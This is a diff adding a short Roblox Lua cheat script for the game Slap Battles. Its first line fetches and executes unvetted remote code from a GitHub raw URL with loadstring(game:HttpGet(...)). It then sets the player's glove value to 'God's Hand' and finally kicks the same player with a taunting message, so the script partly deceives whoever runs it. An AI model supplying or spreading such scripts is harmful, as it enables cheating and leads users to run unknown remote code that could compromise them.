@@ -1,0 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScripts2020/SlapBattlesCoders/refs/heads/main/GetAllSlapGloves/Bypass/2025/refs/head/.text'))()
+wait(2)
+game.Players.LocalPlayer.leaderstats.Glove.Value = "God's Hand"
+wait(60)
+game.Players.LocalPlayer:Kick("Huh? how do u have that glove that with low status oh well imagine exploiting hahahhahaah ")
